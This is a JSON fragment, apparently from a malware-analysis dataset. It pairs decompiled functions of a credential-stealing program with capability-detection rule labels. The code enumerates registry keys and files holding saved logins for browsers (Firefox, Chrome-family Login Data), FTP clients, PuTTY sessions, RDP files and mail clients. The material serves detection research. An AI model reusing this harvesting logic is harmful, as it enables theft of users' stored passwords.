        "decompiled_code": "\nvoid __cdecl fcn.00409dcb(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint arg_ch;\n    uint arg_8h_01;\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x25, 0);\n    arg_8h_00 = fcn.00401eb1(0x1a);\n    if (arg_8h_00 != 0) {\n        arg_ch = fcn.00401e4c(arg_8h_00, \"\\\\Mozilla\\\\Firefox\\\\\");\n        arg_8h_01 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch, \"fireFTPsites.dat\", 0xbeef1000);\n        fcn.004018b8(arg_8h_01);\n    }\n    *0x416030 = 1;\n    fcn.0041075a(0x104, &var_109h);\n    fcn.00409c3c(arg_8h, *0x414869, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    fcn.00409c3c(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    fcn.00410748(&var_109h);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 335
    },
    "00409e81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e81(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x26, 0);\n    *0x416030 = 0;\n    fcn.0041075a(0x104, &var_109h);\n    fcn.00409c3c(arg_8h, *0x414869, \"Software\\\\Mozilla\", \"SeaMonkey\", \"\\\\Mozilla\\\\SeaMonkey\\\\\");\n    fcn.00409c3c(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"SeaMonkey\", \"\\\\Mozilla\\\\SeaMonkey\\\\\");\n    fcn.00410748(&var_109h);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 195
    },
    "00409f08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409f08(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x27, 0);\n    *0x416030 = 0;\n    fcn.0041075a(0x104, &var_109h);\n    fcn.00409c3c(arg_8h, *0x414869, \"Software\\\\Mozilla\", \"Flock\", \"\\\\Flock\\\\Browser\\\\\");\n    fcn.00409c3c(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Flock\", \"\\\\Flock\\\\Browser\\\\\");\n    fcn.00410748(&var_109h);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 195
    },
    "00409f8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409f8f(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x28, 0);\n    *0x416030 = 0;\n    fcn.0041075a(0x104, &var_109h);\n    fcn.00409c3c(arg_8h, *0x414869, \"Software\\\\Mozilla\", \"Mozilla\", \"\\\\Mozilla\\\\Profiles\\\\\");\n    fcn.00409c3c(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Mozilla\", \"\\\\Mozilla\\\\Profiles\\\\\");\n    fcn.00410748(&var_109h);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 192
    },
    "0040a016": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a016(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x29, 0);\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\LeechFTP\", \"AppDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, \"bookmark.dat\", 0xbeef0000);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\LeechFTP\", \"LocalDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, \"bookmark.dat\", 0xbeef0000);\n        fcn.004018b8(uVar2);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 269
    },
    "0040a1c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a1c2(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x2c, 0);\n    arg_8h_00 = fcn.00401d71(0x80000000, \"CLSID\\\\{11C1D741-A95B-11d2-8A80-0080ADB32FF4}\\\\InProcServer32\", 0, 0);\n    if (arg_8h_00 != 0) {\n        arg_ch_00 = fcn.0040242b(arg_8h_00);\n        arg_8h_01 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch_00, \"sites.db\", 0xbeef0000);\n        fcn.004018b8(arg_8h_01);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 258
    },
    "0040a21c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftpgetter information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a21c(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x2d, 0);\n    fcn.0040439c(arg_8h, \"\\\\FTPGetter\", \"servers.xml\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040a257": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather alftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a257(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x2e, 0);\n    fcn.0040439c(arg_8h, \"\\\\Estsoft\\\\ALFTP\", \"ESTdb2.dat\", 0xbeef0000);\n    fcn.0040439c(arg_8h, \"\\\\Estsoft\\\\ALFTP\", \"QData.dat\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 140
    },
    "0040a2a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2a9(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    iVar1 = (**(*arg_10h + 0x1c))(arg_10h, 0, arg_8h, &var_4h, 0);\n    if (iVar1 == 0) {\n        fcn.004106e2(0, 0, *(var_4h + 4), 0xffffffff, arg_ch, 0x3ff, 0, 0);\n        fcn.0041079c(var_4h);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0040a2f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2f4(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    iVar1 = (**(*arg_14h + 0x28))(arg_14h, 0, arg_8h, arg_ch, &var_4h, 0);\n    if (iVar1 == 0) {\n        fcn.004106e2(0, 0, *(var_4h + 4), 0xffffffff, arg_10h, 0x3ff, 0, 0);\n        fcn.0041079c(var_4h);\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "0040b012": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b012(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x30, 0);\n    fcn.0040aed7(arg_8h, \"Software\\\\Adobe\\\\Common\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 94
    },
    "0040c0ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c0ce(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00401000(&var_4h);\n    iVar1 = fcn.0040120d(arg_ch, var_4h);\n    if (iVar1 != 0) {\n        fcn.0040bf32(var_4h, arg_8h);\n    }\n    fcn.00401021(var_4h);\n    return;\n}\n",
        "token_count": 116
    },
    "0040c1ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c1ce(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x32, 0);\n    fcn.0040c13d(arg_8h, 0x416534);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 95
    },
    "0040c230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c230(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_ch_00;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x34, 0);\n    fcn.0040c13d(arg_8h, 0x41654d);\n    arg_ch_00 = fcn.00401d71(*0x414869, 0x416559, 0x41656d, 0);\n    if (arg_ch_00 != 0) {\n        fcn.004041a6(arg_8h, arg_ch_00, \"Web Data\", 0xbeef0000, fcn.0040c0ce);\n        fcn.004041a6(arg_8h, arg_ch_00, \"Login Data\", 0xbeef0000, fcn.0040c0ce);\n        fcn.004018b8(arg_ch_00);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 249
    },
    "0040c2bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c2bb(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x35, 0);\n    fcn.0040c13d(arg_8h, 0x416579);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 95
    },
    "0040c2ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c2ec(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x36, 0);\n    fcn.0040c13d(arg_8h, 0x416582);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 95
    },
    "0040c31d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c31d(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x37, 0);\n    fcn.0040c13d(arg_8h, 0x41658c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 96
    },
    "0040c34e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c34e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x38, 0);\n    fcn.0040c13d(arg_8h, 0x416594);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 95
    },
    "0040c6f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6f0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x3c, 0);\n    fcn.0040c67f(arg_8h, 0x1a);\n    fcn.0040c67f(arg_8h, 0x23);\n    fcn.0040c67f(arg_8h, 0x1c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 136
    },
    "0040c769": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c769(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x3d, 0);\n    fcn.0040c732(arg_8h, 0x1a);\n    fcn.0040c732(arg_8h, 0x23);\n    fcn.0040c732(arg_8h, 0x1c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 131
    },
    "0040c98a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c98a(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x40, 0);\n    iVar1 = fcn.00401d71(0x80000000, \"FTP++.Link\\\\shell\\\\open\\\\command\", 0, 0);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040242b(iVar1);\n        if (iVar1 != 0) {\n            arg_8h_00 = arg_8h;\n            fcn.00404351(arg_8h, iVar1, \".fpl\", 0xbeef0000);\n            fcn.004018b8(arg_8h_00);\n        }\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 219
    },
    "0040cb74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cb74(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint arg_8h_01;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x43, 0);\n    arg_8h_00 = fcn.00401d71(0x80000002, \n                             \"SOFTWARE\\\\Classes\\\\TypeLib\\\\{F9043C88-F6F2-101A-A3C9-08002B2F49FB}\\\\1.2\\\\0\\\\win32\", 0, 0);\n    if (arg_8h_00 != 0) {\n        iVar1 = fcn.00410808(arg_8h_00, \"EasyFTP\");\n        if (iVar1 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.004041a6(arg_8h, arg_ch_00, 0, 0xbeef0000, fcn.0040cb28);\n            fcn.004018b8(arg_8h_01);\n        }\n        fcn.004018b8(arg_8h_00);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 336
    },
    "0040cbee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather xftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cbee(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x44, 0);\n    fcn.0040439c(arg_8h, \"\\\\NetSarang\", \".xfp\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040cf9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cf9b(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_ch_00;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x45, 0);\n    fcn.0040ccda(arg_8h);\n    arg_ch_00 = fcn.00401eb1(5);\n    if (arg_ch_00 != 0) {\n        arg_8h_00 = arg_8h;\n        fcn.004041a6(arg_8h, arg_ch_00, \".rdp\", 0xbeef0000, fcn.0040ce3d);\n        fcn.004018b8(arg_8h_00);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 202
    },
    "0040d35a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather robo-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d35a(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x47, 0);\n    fcn.0040d072(arg_8h, *0x414869, \"SOFTWARE\\\\Robo-FTP 3.7\\\\FTPServers\");\n    fcn.0040d072(arg_8h, 0x80000002, \"SOFTWARE\\\\Robo-FTP 3.7\\\\FTPServers\");\n    fcn.0040d2cb(arg_8h, *0x414869);\n    fcn.0040d2cb(arg_8h, 0x80000002);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 187
    },
    "0040d796": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d796(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x49, 0);\n    fcn.0040d5c0(arg_8h, \"Software\\\\LinasFTP\\\\Site Manager\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 99
    },
    "0040d7c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d7c7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0041066a(arg_ch);\n    if (iVar1 == 0) {\n        return;\n    }\n    var_8h = fcn.0041066a(arg_10h);\n    if (var_8h == 0) {\n        return;\n    }\n    var_4h = fcn.004018cf(var_8h);\n    iVar1 = fcn.00402699(arg_10h, var_8h, var_4h);\n    if (iVar1 != 0) {\n        var_ch = iVar1;\n        iVar1 = fcn.004043dc(var_4h, &var_ch, 0);\n        if (iVar1 != 0) {\n            fcn.00401569(arg_8h, 0xbeef1000);\n            fcn.004015cb(arg_8h, arg_ch);\n            fcn.0040159f(arg_8h, var_4h, var_ch);\n        }\n    }\n    fcn.004018b8(var_4h);\n    return;\n}\n",
        "token_count": 292
    },
    "0040d9a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather cyberduck information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d9a1(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x4a, 0);\n    fcn.0040d965(arg_8h, 0x1a);\n    fcn.0040d965(arg_8h, 0x23);\n    fcn.0040d965(arg_8h, 0x1c);\n    fcn.0040439c(arg_8h, \"\\\\Cyberduck\", \".duck\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 161
    },
    "0040dbde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dbde(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x4b, 0);\n    fcn.0040d9fa(*0x414869, \"Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\", arg_8h);\n    fcn.0040d9fa(0x80000002, \"Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\", arg_8h);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 140
    },
    "0040dc27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dc27(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x4c, 0);\n    fcn.0040439c(arg_8h, \"\\\\Notepad++\", \"NppFTP.xml\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 106
    },
    "0040de9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather direct-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de9b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x4d, 0);\n    fcn.0040dc62(*0x414869, \"Software\\\\CoffeeCup Software\", arg_8h);\n    fcn.0040dc62(0x80000002, \"Software\\\\CoffeeCup Software\", arg_8h);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 131
    },
    "0040df62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftpinfo information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040df62(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_ch_00;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x4f, 0);\n    arg_ch_00 = fcn.00401d71(*0x414869, \"Software\\\\MAS-Soft\\\\FTPInfo\\\\Setup\", 0x416a3e, 0);\n    if (arg_ch_00 != 0) {\n        arg_8h_00 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch_00, \"ServerList.xml\", 0xbeef0000);\n        fcn.004018b8(arg_8h_00);\n    }\n    fcn.0040439c(arg_8h, \"\\\\FTPInfo\", \"ServerList.xml\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 235
    },
    "0040e0cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e0cd(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x52, 0);\n    fcn.0040c13d(arg_8h, \"\\\\MapleStudio\\\\ChromePlus\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 97
    },
    "0040e449": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather winzip information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e449(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x53, 0);\n    fcn.0040e237(*0x414869, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\FTP\", arg_8h);\n    fcn.0040e237(0x80000002, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\FTP\", arg_8h);\n    fcn.0040e380(*0x414869, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\mru\\\\jobs\", arg_8h);\n    fcn.0040e380(0x80000002, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\mru\\\\jobs\", arg_8h);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 210
    },
    "0040e4b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e4b7(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x54, 0);\n    fcn.0040c13d(arg_8h, \"\\\\Yandex\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 94
    },
    "0040e5ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e5ce(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x56, 0);\n    fcn.0040e566(arg_8h, \"{74FF1730-B1F2-4D88-926B-1568FAE61DB7}\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 113
    },
    "0040e5ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather nova-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e5ff(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x57, 0);\n    fcn.0040439c(arg_8h, \"\\\\INSoftware\\\\NovaFTP\", \"NovaFTP.db\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 107
    },
    "0040e89b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e89b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x59, 0);\n    fcn.0040e85d(arg_8h, \"\\\\Microsoft\\\\Windows Live Mail\", \"Software\\\\Microsoft\\\\Windows Live Mail\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040e8d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e8d1(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x58, 0);\n    fcn.0040e85d(arg_8h, \"\\\\Microsoft\\\\Windows Mail\", \"Software\\\\Microsoft\\\\Windows Mail\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040e907": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e907(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x5a, 0);\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(0x80000002, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDirBak\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(0x80000002, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDirBak\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.004018b8(uVar2);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 486
    },
    "0040eb43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eb43(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x5b, 0);\n    fcn.0040e9f9(*0x414869, \"Software\\\\Poco Systems Inc\", arg_8h);\n    fcn.0040e9f9(0x80000002, \"Software\\\\Poco Systems Inc\", arg_8h);\n    fcn.0040439c(arg_8h, \"\\\\Pocomail\", \"accounts.ini\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 163
    },
    "0040eeae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eeae(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x5c, 0);\n    fcn.0040eba3(*0x414869, \"Software\\\\IncrediMail\", arg_8h);\n    fcn.0040eba3(0x80000002, \"Software\\\\IncrediMail\", arg_8h);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 128
